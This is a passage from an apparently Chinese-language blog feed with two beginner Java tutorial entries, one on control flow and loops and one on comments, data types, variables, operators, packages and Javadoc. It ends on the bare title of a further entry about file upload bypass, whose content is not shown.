punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、顺序结构"><a href="#2、顺序结构" class="headerlink" title="2、顺序结构"></a>2、顺序结构</h2><p>Java基本结构，除特别指明外按照顺序依次执行。</p><h2 id="3、选择结构"><a href="#3、选择结构" class="headerlink" title="3、选择结构"></a>3、选择结构</h2><h3 id="If-选择结构"><a href="#If-选择结构" class="headerlink" title="If 选择结构"></a><code>If</code> 选择结构</h3><ul><li><code>If</code>单选择结构</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>布尔表达式<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//布尔表达式为true执行代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>If</code>双选择结构</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>布尔表达式<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//布尔表达式为true执行代码</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  <span class="token comment">//布尔表达式为false执行代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>If</code>多选择结构</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>布尔表达式 <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//如果布尔表达式 1为true执行代码</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>布尔表达式 <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//如果布尔表达式 2为true执行代码</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>布尔表达式 <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//如果布尔表达式 3为true执行代码</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  <span class="token comment">//如果以上表达式都不为true执行代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>if</code>嵌套结构</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>布尔表达式 <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//如果布尔表达式 1为true执行代码</span><span class="token keyword">if</span><span class="token punctuation">(</span>布尔表达式 <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//如果布尔表达式 2为true执行代码</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Switch选择结构"><a href="#Switch选择结构" class="headerlink" title="Switch选择结构"></a><code>Switch</code>选择结构</h3><ul><li><code>switch case</code> 判断一个变量与一系列值中某个值是否相等，每个值成为一个分支。</li><li><code>jdk7</code>之后，<code>switch</code>支持**字符串<code>String</code>**类型；</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//case 穿透 </span><span class="token keyword">switch</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">case</span> value<span class="token operator">:</span>    <span class="token comment">//语句</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">//可选</span><span class="token keyword">case</span> value<span class="token operator">:</span>    <span class="token comment">//语句</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">//可选</span>  <span class="token keyword">default</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>可选    <span class="token comment">//语句</span><span class="token punctuation">&#125;</span><span class="token comment">//break可选，但如果匹配到某一个分支，后该分支没有break，则之后的分支均会执行。</span><span class="token comment">//default：以上分支均没有匹配到时执行；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、循环结构"><a href="#4、循环结构" class="headerlink" title="4、循环结构"></a>4、循环结构</h2><h3 id="While循环"><a href="#While循环" class="headerlink" title="While循环"></a><code>While</code>循环</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">while</span><span class="token punctuation">(</span>布尔表达式<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//循环内容</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>只要表达式为<code>true</code>，循环就会一直走下去。</li><li><strong>需要一个表达式失效的方式来结束循环</strong></li><li>避免死循环（循环条件一直为<code>true</code>）</li></ul><h3 id="Do-While循环"><a href="#Do-While循环" class="headerlink" title="Do While循环"></a><code>Do While</code>循环</h3><ul><li><code>while</code>循环若不满足条件不会进入循环，<strong>先判断后执行</strong>；</li><li>对于<code>do while</code>至少循环一次，<strong>先执行后判断</strong>；</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">do</span><span class="token punctuation">&#123;</span>  <span class="token comment">//代码语句</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>布尔表达式<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="For循环"><a href="#For循环" class="headerlink" title="For循环"></a><code>For</code>循环</h3><ul><li><code>for</code>循环是支持迭代的一种通用结构，<strong>是最有效,最灵活的循环结构</strong>。</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span>初始化<span class="token punctuation">;</span>布尔表达式<span class="token punctuation">;</span>更新<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//代码语句</span><span class="token punctuation">&#125;</span><span class="token comment">/*最先执行初始化，可声明一种类型，但可初始化一个或多个循环变量，也可以是空语句然后检测布尔类型的值，true执行循环体，false终止循环；执行一次循环后，更新循环控制变量再次检测布尔表达式...*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>实例（1）：循环输出1-1000，能被5整除的数，每行输出3个</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo06</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//循环输出1-1000，能被5整除的数，每行输出3个</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">15</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//换行</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//换行</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//println输出完会换行</span>        <span class="token comment">//print输出完不换行</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>实例（2）：打印九九乘法表</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ForDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//打印九九乘法表</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">"*"</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">"="</span><span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">*</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//换行</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*1*1=12*1=22*2=43*1=33*2=63*3=94*1=44*2=84*3=124*4=165*1=55*2=105*3=155*4=205*5=256*1=66*2=126*3=186*4=246*5=306*6=367*1=77*2=147*3=217*4=287*5=357*6=427*7=498*1=88*2=168*3=248*4=328*5=408*6=488*7=568*8=649*1=99*2=189*3=279*4=369*5=459*6=549*7=639*8=729*9=81*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>实例（3）：打印三角形</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//打印三角形</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> j <span class="token operator">>=</span>i<span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打印空格</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span>i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span>i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*     *    ***   *****  ******* **********/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="补充：增强for循环"><a href="#补充：增强for循环" class="headerlink" title="补充：增强for循环"></a>补充：增强<code>for</code>循环</h3><ul><li><strong>Java 5</strong>引入主要用于数组或集合的增强for循环；</li><li><strong>声明语句</strong>：声明新的<strong>局部变量</strong>，该变量类型必须和<strong>数组元素类型匹配</strong>。作用域限定在循环语句块，其值与此时数组元素值相等。</li><li><strong>表达式</strong>：表达式是要访问的数组名，或返回值为数组的方法。</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span>声明语句<span class="token operator">:</span>表达式<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//代码句子</span><span class="token punctuation">&#125;</span><span class="token comment">//----------------------------------------------</span><span class="token comment">//例：</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> numbers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//定义一个数组</span><span class="token comment">//遍历数组的元素</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">:</span> numbers<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*1020304050*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、break与continue"><a href="#5、break与continue" class="headerlink" title="5、break与continue"></a>5、<code>break</code>与<code>continue</code></h2><ul><li><p><code>break</code>：在任何循环语句的主体部分，均可用<code>break</code>控制循环的流程。<code>break</code><strong>用于强行退出循环不执行循环中剩余的语句。</strong></p></li><li><p><code>continue</code>：在循环体中<strong>终止某次循环过程</strong>，跳过循环体中尚未执行的语句，<strong>接着进行下一次是否循环的判定</strong>。</p></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.bilibili.com/video/BV12J41137hu">https://www.bilibili.com/video/BV12J41137hu</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础语法(Part-1)</title>
      <link href="/2022/02/28/java-ji-chu/"/>
      <url>/2022/02/28/java-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h1><h2 id="1、注释"><a href="#1、注释" class="headerlink" title="1、注释"></a>1、注释</h2><ul><li>单行注释</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//单行注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>多行注释</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*多行注释多行注释多行注释*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>文档注释</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Javadoc：文档注释  /**  */</span><span class="token comment">/***@Description HelloWorld*@Author 白芨*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、标识符"><a href="#2、标识符" class="headerlink" title="2、标识符"></a>2、标识符</h2><p>Java所有组成部分都需要名字，<strong>类名</strong>、<strong>变量名</strong>以及<strong>方法名</strong>都称为标识符。</p><ul><li>所有标识符应该以字母（ A-Z 或者 a-z ）美元符（ $ ）下划线( _ ) 开始</li><li><strong>不能使用关键字作为变量名、方法名</strong></li><li>标识符<strong>大小写敏感</strong></li></ul><h2 id="3、数据类型"><a href="#3、数据类型" class="headerlink" title="3、数据类型"></a>3、数据类型</h2><p><strong>强类型语言</strong></p><ul><li>要求变量使用严格符合规定，所有变量要求先定义才能使用</li></ul><h3 id="基本类型（primitive-type）"><a href="#基本类型（primitive-type）" class="headerlink" title="基本类型（primitive type）"></a>基本类型（primitive type）</h3><p><em><strong>八大基本数据类型</strong></em></p><table><thead><tr><th>数值类型</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>整数类型</td><td><code>byte</code>占<code>1</code>个字节；</td><td><code>short</code>占<code>2</code>个字节；</td><td><code>int</code>占<code>4</code>个字节；</td><td><code>long</code>占<code>8</code>个字节,<code>long</code>类型要在数字后加<code>L</code>;</td></tr><tr><td>浮点类型</td><td><code>double</code>占<code>8</code>个字节</td><td></td><td></td><td><code>float</code>占<code>4</code>个字节,<code>float</code>类型要在数字后加<code>F</code>；</td></tr><tr><td>字符类型</td><td><code>char</code>占<code>2</code>个字节</td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>Boolean</th></tr></thead><tbody><tr><td>占<code>1</code><strong>位</strong>，其值只有<code>true</code>和<code>false</code>两个。</td></tr></tbody></table><p><strong>补充：</strong></p><p><strong>位</strong>（<code>bit</code>）：计算机内部<strong>数据存储</strong>最小单位</p><p><strong>字节</strong>（<code>byte</code>）：计算机<strong>数据处理</strong>基本单位，习惯用大写<strong>B</strong>表示。</p><p><code>1B（byte，字节）=8bit（位）</code></p><h3 id="引用类型（reference-type）"><a href="#引用类型（reference-type）" class="headerlink" title="引用类型（reference type）"></a>引用类型（reference type）</h3><ul><li>类</li><li>接口</li><li>数组</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//整数扩展：进制表示： 二进制0b八进制0十进制十六进制0x</span><span class="token comment">//浮点数扩展：有限 离散 舍入误差 接近但不等于；最好完全避免使用浮点数进行比较</span><span class="token comment">//字符扩展：所有字符本质还是数字；Unicode编码表：两个字节 0-65536；表示：\u0061 = a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>Java是强类型语言，运算时需将不同类型数据转换为同一类型然后进行运算。</p><p>优先级低 -&gt; 高：byte、short、char、-&gt; int  -&gt; long -&gt; float -&gt; double</p><ul><li>强制类型转换：(类型)变量名         高-&gt;低</li><li>自动类型转换</li></ul><p>​    <em>1、不能对布尔值转换</em></p><p>​    <em>2、不能把对象类型转换为不相干类型</em></p><p>​    <em>3、转换时可能存在内存溢出，或精度问题</em></p><h2 id="4、变量、常量"><a href="#4、变量、常量" class="headerlink" title="4、变量、常量"></a>4、变量、常量</h2><ul><li>Java每个变量必须声明其类型</li><li>Java变量是程序中最基本的<strong>存储单元</strong>，其类型包括<strong>变量名</strong>、<strong>变量类型</strong>、<strong>作用域</strong></li><li>每个变量都有类型，可以是<strong>基本类型</strong>、也可以是<strong>引用类型</strong></li><li>变量名必须是合法标识符</li><li>变量声明是一条完整语句，以分号<code>;</code>结束。</li></ul><p><strong>变量：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//局部变量,写方法中；只在对应方法中生效。</span><span class="token comment">//main方法</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//局部变量，必须声明和初始化值</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//---------------------------------------</span><span class="token comment">//实例变量：写在类之内，方法之外。从属于对象；</span><span class="token comment">/*如果不自行初始化，输出对应类型的默认值；数值：0 0.0 布尔：false除基本类型其余默认值：null*/</span><span class="token comment">//----------------------------------------</span><span class="token comment">//类变量：static</span><span class="token comment">//从属于类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>命名规范：</p><ul><li>所有变量、方法名、类名：见名知意</li><li>类成员变量、类名、方法名：首字母小写驼峰原则<strong>monthSalary</strong></li><li>常量：大写字母和下划线<strong>MAX_VALUE</strong></li></ul><p><strong>常量：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//常量 初始化后不能再改变，一般使用大些字符</span><span class="token comment">//final 修饰符，不存在先后顺序</span><span class="token keyword">final</span> 常量名 <span class="token operator">=</span> 值；<span class="token keyword">final</span> <span class="token keyword">double</span> PI <span class="token operator">=</span> <span class="token number">3.14</span>； <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、运算符、字符串连接符"><a href="#5、运算符、字符串连接符" class="headerlink" title="5、运算符、字符串连接符"></a>5、运算符、字符串连接符</h2><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul><li>算数运算符</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/* -------------------------------------加、减、乘、除、取余（模运算）、自增、自减；‘+’ 、 ‘-’ 、 ‘*’ 、’/‘（注意类型）、‘%’ 、‘++’、‘--’；--------------------------------------*/</span><span class="token comment">//例：’a++‘(先执行后自增)、‘++a’(先自增后执行)</span><span class="token comment">//幂运算(java 中无 '^'; 需借助工具类如下2^3表示：)</span>    <span class="token keyword">double</span> pow <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>pow<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>赋值运算符 =</p></li><li><p>关系运算符 <code>&#39;&gt;&#39;、&#39;&lt;&#39;、&#39;&gt;=&#39;、&#39;&lt;=&#39;、‘==’、&#39;!=&#39;</code></p></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*-----------------------------------大于、小于、大于等于、小于等于、等于、不等于'>'、'&lt;'、'>='、'&lt;='、‘==’、'!=' ------------------------------------*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>逻辑运算符<code>’&amp;&amp;(与)‘、  ’||（或）‘、  ‘!（非）’</code></li><li>位运算符</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*----------------------------------------------------------与、或、异或（相同为0，不同为1）、取反、左移(2&lt;&lt;3 == 2*2*2*2)、右移'&amp;'、'|'、 '^'、 '~'、'&lt;&lt;'、‘>>’ -----------------------------------------------------------*/</span><span class="token comment">/*--------------例：A = 0011 1100B = 0000 1101  A&amp;B = 0000 1100A|B = 0011 1101A^B = 0011 0001~B = 1111 0010---------------*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>条件运算符  </li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//例：</span><span class="token comment">//x ? y : z;</span><span class="token comment">//x 若为true则结果为y；false则结果为z；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>扩展赋值运算符<code>（a+=b）等于 a=a+b</code></li></ul><h3 id="字符串连接符"><a href="#字符串连接符" class="headerlink" title="字符串连接符"></a>字符串连接符</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">a <span class="token operator">=</span> <span class="token number">10</span>b <span class="token operator">=</span> <span class="token number">8</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token operator">+</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//108</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6、包机制"><a href="#6、包机制" class="headerlink" title="6、包机制"></a>6、包机制</h2><ul><li>Java包机制，用于区别于类名的命名空间。</li><li>包语句语法格式：</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">pk1</span><span class="token punctuation">[</span><span class="token punctuation">.</span>pk2<span class="token punctuation">[</span><span class="token punctuation">.</span>pk3<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token comment">//定义包</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>一般利用公司域名倒置作为包名</strong>：com.baidu.www</li><li>使用<code>import</code>语句导入包，可使用该包的成员</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">pk1</span><span class="token punctuation">[</span><span class="token punctuation">.</span>pk2<span class="token punctuation">[</span><span class="token punctuation">.</span>pk3<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token comment">//导入包</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="7、JavaDoc生成文档"><a href="#7、JavaDoc生成文档" class="headerlink" title="7、JavaDoc生成文档"></a>7、JavaDoc生成文档</h2><ul><li>javadoc命令用来生成自己的API文档</li><li><strong>参数信息</strong><ul><li>@author 作者名</li><li>@version 版本号</li><li>@since 指明需要最早使用的jdk版本</li><li>@param 参数名</li><li>@return 返回值情况</li><li>@throws 异常抛出情况</li></ul></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.bilibili.com/video/BV12J41137hu">https://www.bilibili.com/video/BV12J41137hu</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传绕过</title>
